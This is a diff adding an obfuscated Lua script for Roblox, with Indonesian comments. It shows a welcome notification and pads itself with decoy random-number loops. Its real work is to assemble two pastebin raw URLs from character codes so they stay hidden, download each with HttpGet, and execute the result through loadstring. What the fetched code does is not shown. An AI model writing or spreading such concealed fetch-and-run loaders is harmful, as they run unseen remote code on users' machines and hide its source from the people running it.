@@ -1,0 +1,68 @@
+-- Kombinasi Script dengan Notifikasi yang Di-*Obfuscate* Secara Mendalam
+
+-- Variabel Acak dan Pengacakan Lebih Dalam
+local _HzK3 = game
+local _Nq8 = _HzK3["StarterGui"]
+local Wf4h8 = string.char(83) .. string.char(101) .. string.char(110) .. "dNotification"
+local pYzR9 = {
+    Title = "Welcome",
+    Text = "This script is made by " .. string.char(67) .. string.char(101) .. string.char(108) .. "lo",
+    Duration = math.sqrt(1)
+}
+
+-- Fungsi Notifikasi yang Di-*Obfuscate*
+local function sendNotification()
+    _Nq8:SetCore(Wf4h8, pYzR9)
+end
+sendNotification()
+
+-- Fungsi Operasi Acak yang Kompleks
+local function randomizerFunction()
+    local j, k, m = 4321, 8765, 121314
+    for i = 1, math.random(5, 10) do
+        j = (j + m) % k
+        k = (k * m + j) % 100000
+    end
+    return j + k + m
+end
+randomizerFunction()
+
+-- Mengacak URL dengan Logika Kompleks
+local function generateUrl1()
+    local baseUrl = ("h" .. "t" .. "tp") .. string.char(115) .. ":/" .. "/pastebin.com/"
+    local sectionA = string.char(114) .. string.char(97) .. string.char(119) .. "/"
+    local finalPart = string.char(105) .. string.char(50) .. "fzc" .. string.char(71) .. "wn"
+    return baseUrl .. sectionA .. finalPart
+end
+
+local function generateUrl2()
+    local baseUrl = ("h" .. "t" .. "tp") .. string.char(115) .. ":/" .. "/pastebin.com/"
+    local sectionA = string.char(114) .. string.char(97) .. string.char(119) .. "/"
+    local finalPart = string.char(101) .. "caN" .. string.char(49) .. "3Rd"
+    return baseUrl .. sectionA .. finalPart
+end
+
+-- Script 1 yang Dimuat
+local function loadScriptA()
+    local url1 = generateUrl1()
+    local responseA = _HzK3["HttpGet"](_HzK3, url1)
+    loadstring(responseA)()
+end
+loadScriptA()
+
+-- Script 2 yang Dimuat
+local function loadScriptB()
+    local url2 = generateUrl2()
+    local responseB = _HzK3["HttpGet"](_HzK3, url2)
+    loadstring(responseB)()
+end
+loadScriptB()
+
+-- Loop dan Kondisi Acak untuk Menambah Kebingungan
+for i = 1, math.random(3, 7) do
+    randomizerFunction()
+    local randCheck = math.random(1, 1000)
+    if randCheck % math.random(2, 10) == 0 then
+        sendNotification() -- Panggil notifikasi acak
+    end
+end
